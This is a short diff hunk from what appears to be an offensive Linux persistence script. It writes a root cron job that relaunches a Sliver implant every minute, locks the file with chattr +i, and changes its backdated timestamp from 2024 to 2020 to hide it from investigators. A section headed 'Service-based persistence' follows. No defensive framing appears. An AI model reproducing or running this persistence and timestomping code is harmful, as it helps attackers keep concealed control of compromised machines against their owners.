@@ -83,7 +83,7 @@ cat <<EOF > /etc/cron.d/mdb
 * * * * * root pgrep -x $RANDOM_BINARY_NAME >/dev/null || $SLIVER_PAYLOAD_PATH >/dev/null 2>&1
 EOF
 chmod 644 /etc/cron.d/mdb
-touch -d "12 Jul 2024" /etc/cron.d/mdb
+touch -d "12 Jul 2020" /etc/cron.d/mdb
 chattr +i /etc/cron.d/mdb 2>/dev/null
 
 # Service-based persistence
